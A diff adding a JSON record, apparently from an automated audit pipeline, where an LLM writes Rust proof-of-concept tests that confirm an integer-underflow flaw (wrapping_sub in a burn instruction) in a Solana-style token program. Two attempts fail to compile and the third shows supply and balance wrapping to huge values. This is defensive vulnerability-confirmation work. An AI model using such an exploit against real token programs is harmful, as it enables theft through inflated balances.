@@ -1,0 +1,140 @@
+{
+  "category": "MATH",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: supply deu a volta (underflow); balance deu a volta (underflow)",
+  "attempts_used": 3,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2368,
+        "completion_tokens": 526,
+        "latency_s": 3.39
+      },
+      "raw": "{\n  \"plan\": \"Preparar uma conta ledger com supply=100 e balance=100 nos offsets 40 e 48, dona do programa. O baseline chama burn com amount=10, reduzindo supply e balance para 90. O ataque chama burn com amount=200, maior que o balance, e o wrapping_sub deve fazer os valores darem a volta para perto de u64::MAX. O efeito mede que o supply ou o balance resultante ficou maior que o valor inicial, indicando underflow silencioso.\",\n  \"scenario\": \"let ledger_key = Pubkey::new_unique();\\nlet mut ledger_data = vec![0u8; 56];\\nledger_data[40..48].copy_from_slice(&100u64.to_le_bytes());\\nledger_data[48..56].copy_from_slice(&100u64.to_le_bytes());\\nlet ledger = account(&env.program_id, &ledger_data, None);\\n\\nlet metas = vec![AccountMeta::new(ledger_key, false)];\\nlet contas = vec![(ledger_key, ledger.clone())];\\n\\nlet ix_legit = env.raw_ix(&[IX_BURN, 10u64.to_le_bytes().as_ref()].concat(), metas.clone());\\nlet r_base = env.baseline(\\\"burn legitimo de 10\\\", &ix_legit, &contas);\\n\\nlet contas_apos_base: Vec<(Pubkey, AccountSharedData)> = r_base.resulting_accounts.clone();\\n\\nlet ix_ataque = env.raw_ix(&[IX_BURN, 200u64.to_le_bytes().as_ref()].concat(), metas);\\nlet r = env.attack(\\\"burn de 200 com saldo 90\\\", &ix_ataque, &contas_apos_base);\\n\\nif r.program_result == ProgramResult::Success {\\n    let supply = read_u64(after(&r, &ledger_key).data(), 40);\\n    let balance = read_u64(after(&r, &ledger_key).data(), 48);\\n    env.effect(\\\"supply deu a volta (underflow)\\\", supply > 90);\\n    env.effect(\\\"balance deu a volta (underflow)\\\", balance > 90);\\n}\"\n}",
+      "plan": "Preparar uma conta ledger com supply=100 e balance=100 nos offsets 40 e 48, dona do programa. O baseline chama burn com amount=10, reduzindo supply e balance para 90. O ataque chama burn com amount=200, maior que o balance, e o wrapping_sub deve fazer os valores darem a volta para perto de u64::MAX. O efeito mede que o supply ou o balance resultante ficou maior que o valor inicial, indicando underflow silencioso.",
+      "scenario": "let ledger_key = Pubkey::new_unique();\nlet mut ledger_data = vec![0u8; 56];\nledger_data[40..48].copy_from_slice(&100u64.to_le_bytes());\nledger_data[48..56].copy_from_slice(&100u64.to_le_bytes());\nlet ledger = account(&env.program_id, &ledger_data, None);\n\nlet metas = vec![AccountMeta::new(ledger_key, false)];\nlet contas = vec![(ledger_key, ledger.clone())];\n\nlet ix_legit = env.raw_ix(&[IX_BURN, 10u64.to_le_bytes().as_ref()].concat(), metas.clone());\nlet r_base = env.baseline(\"burn legitimo de 10\", &ix_legit, &contas);\n\nlet contas_apos_base: Vec<(Pubkey, AccountSharedData)> = r_base.resulting_accounts.clone();\n\nlet ix_ataque = env.raw_ix(&[IX_BURN, 200u64.to_le_bytes().as_ref()].concat(), metas);\nlet r = env.attack(\"burn de 200 com saldo 90\", &ix_ataque, &contas_apos_base);\n\nif r.program_result == ProgramResult::Success {\n    let supply = read_u64(after(&r, &ledger_key).data(), 40);\n    let balance = read_u64(after(&r, &ledger_key).data(), 48);\n    env.effect(\"supply deu a volta (underflow)\", supply > 90);\n    env.effect(\"balance deu a volta (underflow)\", balance > 90);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0425]: cannot find value `IX_BURN` in this scope\n  --> tests/attempt.rs:18:33\n   |\n18 |     let ix_legit = env.raw_ix(&[IX_BURN, 10u64.to_le_bytes().as_ref()]...\n   |                                 ^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `IX_BURN` in this scope\n  --> tests/attempt.rs:23:34\n   |\n23 |     let ix_ataque = env.raw_ix(&[IX_BURN, 200u64.to_le_bytes().as_ref(...\n   |                                  ^^^^^^^ not found in this scope\n\nFor more information about this error, try `rustc --explain E0425`.\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.7
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0425]: cannot find value `IX_BURN` in this scope\n  --> tests/attempt.rs:18:33\n   |\n18 |     let ix_legit = env.raw_ix(&[IX_BURN, 10u64.to_le_bytes().as_ref()]...\n   |                                 ^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `IX_BURN` in this scope\n  --> tests/attempt.rs:23:34\n   |\n23 |     let ix_ataque = env.raw_ix(&[IX_BURN, 200u64.to_le_bytes().as_ref(...\n   |                                  ^^^^^^^ not found in this scope\n\nFor more information about this error, try `rustc --explain E0425`.\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2975,
+        "completion_tokens": 522,
+        "latency_s": 2.87
+      },
+      "raw": "{\n  \"plan\": \"Preparo uma conta ledger com supply=100 e balance=100 nos offsets 40 e 48. O baseline executa burn de 10 legitimamente, reduzindo supply e balance para 90. O ataque executa burn de 200 sobre o estado resultante (saldo 90), o que com wrapping_sub faz underflow e grava valores proximos de u64::MAX. O efeito verifica que supply e balance ficaram maiores que 90, indicando wrap-around em vez de falha.\",\n  \"scenario\": \"let ledger_key = Pubkey::new_unique();\\nlet mut ledger_data = vec![0u8; 56];\\nledger_data[40..48].copy_from_slice(&100u64.to_le_bytes());\\nledger_data[48..56].copy_from_slice(&100u64.to_le_bytes());\\nlet ledger = account(&env.program_id, &ledger_data, None);\\n\\nlet metas = vec![AccountMeta::new(ledger_key, false)];\\nlet contas = vec![(ledger_key, ledger.clone())];\\n\\nlet ix_legit = env.raw_ix(&[1u8, 10u64.to_le_bytes().as_ref()].concat(), metas.clone());\\nlet r_base = env.baseline(\\\"burn legitimo de 10\\\", &ix_legit, &contas);\\n\\nlet contas_apos_base: Vec<(Pubkey, AccountSharedData)> = r_base.resulting_accounts.clone();\\n\\nlet ix_ataque = env.raw_ix(&[1u8, 200u64.to_le_bytes().as_ref()].concat(), metas);\\nlet r = env.attack(\\\"burn de 200 com saldo 90\\\", &ix_ataque, &contas_apos_base);\\n\\nif r.program_result == ProgramResult::Success {\\n    let supply = read_u64(after(&r, &ledger_key).data(), 40);\\n    let balance = read_u64(after(&r, &ledger_key).data(), 48);\\n    env.effect(\\\"supply deu a volta (underflow)\\\", supply > 90);\\n    env.effect(\\\"balance deu a volta (underflow)\\\", balance > 90);\\n}\"\n}",
+      "plan": "Preparo uma conta ledger com supply=100 e balance=100 nos offsets 40 e 48. O baseline executa burn de 10 legitimamente, reduzindo supply e balance para 90. O ataque executa burn de 200 sobre o estado resultante (saldo 90), o que com wrapping_sub faz underflow e grava valores proximos de u64::MAX. O efeito verifica que supply e balance ficaram maiores que 90, indicando wrap-around em vez de falha.",
+      "scenario": "let ledger_key = Pubkey::new_unique();\nlet mut ledger_data = vec![0u8; 56];\nledger_data[40..48].copy_from_slice(&100u64.to_le_bytes());\nledger_data[48..56].copy_from_slice(&100u64.to_le_bytes());\nlet ledger = account(&env.program_id, &ledger_data, None);\n\nlet metas = vec![AccountMeta::new(ledger_key, false)];\nlet contas = vec![(ledger_key, ledger.clone())];\n\nlet ix_legit = env.raw_ix(&[1u8, 10u64.to_le_bytes().as_ref()].concat(), metas.clone());\nlet r_base = env.baseline(\"burn legitimo de 10\", &ix_legit, &contas);\n\nlet contas_apos_base: Vec<(Pubkey, AccountSharedData)> = r_base.resulting_accounts.clone();\n\nlet ix_ataque = env.raw_ix(&[1u8, 200u64.to_le_bytes().as_ref()].concat(), metas);\nlet r = env.attack(\"burn de 200 com saldo 90\", &ix_ataque, &contas_apos_base);\n\nif r.program_result == ProgramResult::Success {\n    let supply = read_u64(after(&r, &ledger_key).data(), 40);\n    let balance = read_u64(after(&r, &ledger_key).data(), 48);\n    env.effect(\"supply deu a volta (underflow)\", supply > 90);\n    env.effect(\"balance deu a volta (underflow)\", balance > 90);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n  --> tests/attempt.rs:18:38\n   |\n18 | ...1u8, 10u64.to_le_bytes().as_ref()].concat(), metas.clone());\n   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `u8`, found `&[u8]`\n\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:23:39\n   |\n23 | ...u8, 200u64.to_le_bytes().as_ref()].concat(), metas);\n   |        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `u8`, found `&[u8]`\n\nFor more information about this error, try `rustc --explain E0308`.\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:18:38\n   |\n18 | ...1u8, 10u64.to_le_bytes().as_ref()].concat(), metas.clone());\n   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `u8`, found `&[u8]`\n\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:23:39\n   |\n23 | ...u8, 200u64.to_le_bytes().as_ref()].concat(), metas);\n   |        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `u8`, found `&[u8]`\n\nFor more information about this error, try `rustc --explain E0308`.\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 3,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2959,
+        "completion_tokens": 550,
+        "latency_s": 3.03
+      },
+      "raw": "{\"plan\": \"Preparo uma conta ledger com supply=100 e balance=100 nos offsets 40 e 48. O baseline queima 10 legitimamente, deixando supply=90 e balance=90. O ataque queima 200, o que sob balance=90 causa underflow via wrapping_sub. O efeito mede que supply e balance resultantes ficaram proximos de u64::MAX (maiores que 90), provando o wrap-around.\", \"scenario\": \"let ledger_key = Pubkey::new_unique();\\nlet mut ledger_data = vec![0u8; 56];\\nledger_data[40..48].copy_from_slice(&100u64.to_le_bytes());\\nledger_data[48..56].copy_from_slice(&100u64.to_le_bytes());\\nlet ledger = account(&env.program_id, &ledger_data, None);\\n\\nlet metas = vec![AccountMeta::new(ledger_key, false)];\\nlet contas = vec![(ledger_key, ledger.clone())];\\n\\nlet mut ix_data_legit = vec![1u8];\\nix_data_legit.extend_from_slice(&10u64.to_le_bytes());\\nlet ix_legit = env.raw_ix(&ix_data_legit, metas.clone());\\nlet r_base = env.baseline(\\\"burn legitimo de 10\\\", &ix_legit, &contas);\\n\\nlet contas_apos_base: Vec<(Pubkey, AccountSharedData)> = r_base.resulting_accounts.clone();\\n\\nlet mut ix_data_ataque = vec![1u8];\\nix_data_ataque.extend_from_slice(&200u64.to_le_bytes());\\nlet ix_ataque = env.raw_ix(&ix_data_ataque, metas);\\nlet r = env.attack(\\\"burn de 200 com saldo 90\\\", &ix_ataque, &contas_apos_base);\\n\\nif r.program_result == ProgramResult::Success {\\n    let supply = read_u64(after(&r, &ledger_key).data(), 40);\\n    let balance = read_u64(after(&r, &ledger_key).data(), 48);\\n    env.effect(\\\"supply deu a volta (underflow)\\\", supply > 90);\\n    env.effect(\\\"balance deu a volta (underflow)\\\", balance > 90);\\n}\"}",
+      "plan": "Preparo uma conta ledger com supply=100 e balance=100 nos offsets 40 e 48. O baseline queima 10 legitimamente, deixando supply=90 e balance=90. O ataque queima 200, o que sob balance=90 causa underflow via wrapping_sub. O efeito mede que supply e balance resultantes ficaram proximos de u64::MAX (maiores que 90), provando o wrap-around.",
+      "scenario": "let ledger_key = Pubkey::new_unique();\nlet mut ledger_data = vec![0u8; 56];\nledger_data[40..48].copy_from_slice(&100u64.to_le_bytes());\nledger_data[48..56].copy_from_slice(&100u64.to_le_bytes());\nlet ledger = account(&env.program_id, &ledger_data, None);\n\nlet metas = vec![AccountMeta::new(ledger_key, false)];\nlet contas = vec![(ledger_key, ledger.clone())];\n\nlet mut ix_data_legit = vec![1u8];\nix_data_legit.extend_from_slice(&10u64.to_le_bytes());\nlet ix_legit = env.raw_ix(&ix_data_legit, metas.clone());\nlet r_base = env.baseline(\"burn legitimo de 10\", &ix_legit, &contas);\n\nlet contas_apos_base: Vec<(Pubkey, AccountSharedData)> = r_base.resulting_accounts.clone();\n\nlet mut ix_data_ataque = vec![1u8];\nix_data_ataque.extend_from_slice(&200u64.to_le_bytes());\nlet ix_ataque = env.raw_ix(&ix_data_ataque, metas);\nlet r = env.attack(\"burn de 200 com saldo 90\", &ix_ataque, &contas_apos_base);\n\nif r.program_result == ProgramResult::Success {\n    let supply = read_u64(after(&r, &ledger_key).data(), 40);\n    let balance = read_u64(after(&r, &ledger_key).data(), 48);\n    env.effect(\"supply deu a volta (underflow)\", supply > 90);\n    env.effect(\"balance deu a volta (underflow)\", balance > 90);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "burn legitimo de 10",
+            "result": "Success",
+            "compute_units": 226,
+            "account_flags": "-w",
+            "ix_head": "010a000000000000",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 56,
+                "head": "0000000000000000",
+                "digest": "5c80b6c76230a718",
+                "post": "000000000000000000000000000000000000000000000000000000000000000000000000000000005a000000000000005a00000000000000"
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "burn de 200 com saldo 90",
+            "result": "Success",
+            "compute_units": 226,
+            "account_flags": "-w",
+            "ix_head": "01c8000000000000",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 56,
+                "head": "0000000000000000",
+                "digest": "8d97c8f7d91c554e",
+                "post": "0000000000000000000000000000000000000000000000000000000000000000000000000000000092ffffffffffffff92ffffffffffffff"
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "supply deu a volta (underflow)",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "balance deu a volta (underflow)",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 226 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 226 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: supply deu a volta (underflow); balance deu a volta (underflow)"
+    }
+  ],
+  "case_id": "SSP-03-P-V2",
+  "static_finding": {
+    "category": "MATH",
+    "confidence": "high",
+    "evidence": "let new_supply = supply.wrapping_sub(amount);\nlet new_balance = balance.wrapping_sub(amount);",
+    "explanation": "As subtracoes usam `wrapping_sub`, que silenciosamente reinicia o valor em caso de underflow, em vez de `checked_sub` ou de uma pre-condicao `require!(balance >= amount)`. Isso permite que `amount` maior que `supply`/`balance` produza valores enormes por wrap-around.",
+    "attack_hypothesis": "Um atacante chama `burn` com `amount` maior que o `balance` ou `supply` atual. O `wrapping_sub` faz o valor reiniciar para um numero proximo de `u64::MAX`, gravando um saldo/supply inflado na conta."
+  }
+}
